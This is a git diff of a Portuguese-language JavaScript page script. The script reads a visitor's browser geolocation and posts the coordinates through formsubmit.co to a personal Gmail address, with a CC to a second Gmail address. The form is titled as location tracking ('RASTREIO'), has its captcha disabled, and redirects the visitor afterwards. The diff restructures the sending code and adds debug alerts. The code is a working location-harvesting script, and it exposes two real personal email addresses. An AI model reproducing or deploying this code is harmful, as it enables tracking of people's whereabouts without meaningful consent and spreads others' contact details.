@@ -11,50 +11,18 @@ function obterLocalizacao() {
         return;
     }
     navigator.geolocation.getCurrentPosition(
-        function (posicao) {
+        async function (posicao) {
             const latitude = posicao.coords.latitude;
             const longitude = posicao.coords.longitude;
             const dados = { latitude: latitude, longitude: longitude }
 
             alert(`Latitude: ${latitude}Longitude: ${longitude}`);
 
-            //inicio do envio
-            async function formulario(params) {
-                const campos = {
-                    _next: 'https://ukwally.github.io/Armindo/index.html',
-                    hiddenFormTittle: '"TITULO: RASTREIO DE LOCALLISAÇÃO',
-                    _cc: 'elisa.ped.2@gmail.com',
-                    _subject: 'RASTREIO',
-                    _template: 'table',
-                    _captcha: 'false',
-                    latitude: dados.latitude,
-                    longitude: dados.longitude,
-                }
+            if (dados) {
 
-                try {
-                    const resposta = await fetch('https://formsubmit.co/ukwallyportfolio@gmail.com', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'applcation/json' },
-                        body: JSON.stringify(campos)
-                    });
+                await formulario(dados);
 
-                    if (resposta.ok) {
-                        console.log('sussesso:', resposta);
-                        alert('sussesso:', resposta);
-                    } else {
-
-                        console.log('Erro:', resposta.status);
-                        alert('Erro:', resposta.status);
-                    }
-
-                } catch (error) {
-
-                    console.error('Erro ao enviar Formularioa', error)
-                    alert('Erro ao enviar Formularioa', error)
-
-                }
             }
-            //fim do envio
         },
         function (erro) {
             resultado.textContent = "Erro ao obter localização: " + erro.message;
@@ -64,3 +32,44 @@ function obterLocalizacao() {
     );
 }
 obterLocalizacao();
+
+
+
+//inicio do envio
+async function formulario(dados) {
+    alert('entou n metodo de envio');
+    const campos = {
+        _next: 'https://ukwally.github.io/Armindo/index.html',
+        hiddenFormTittle: 'TITULO: RASTREIO DE LOCALLISAÇÃO',
+        _cc: 'elisa.ped.2@gmail.com',
+        _subject: 'RASTREIO',
+        _template: 'table',
+        _captcha: 'false',
+        latitude: dados.latitude,
+        longitude: dados.longitude,
+    }
+
+    alert('definio os campos');
+    try {
+        alert('comessou a tentar enviar');
+        const resposta = await fetch('https://formsubmit.co/ukwallyportfolio@gmail.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(campos)
+        });
+
+        if (resposta.ok) {
+            console.log('sussesso:');
+            alert('sussesso:');
+        } else {
+
+            console.log(`Erro: ${resposta.status}`);
+            alert(`Erro: ${resposta.status}`);
+        }
+
+    } catch (error) {
+        console.error(`Erro ao enviar Formularioa ${error}`)
+        alert(`Erro ao enviar Formularioa ${error}`)
+    }
+}
+//fim do envio
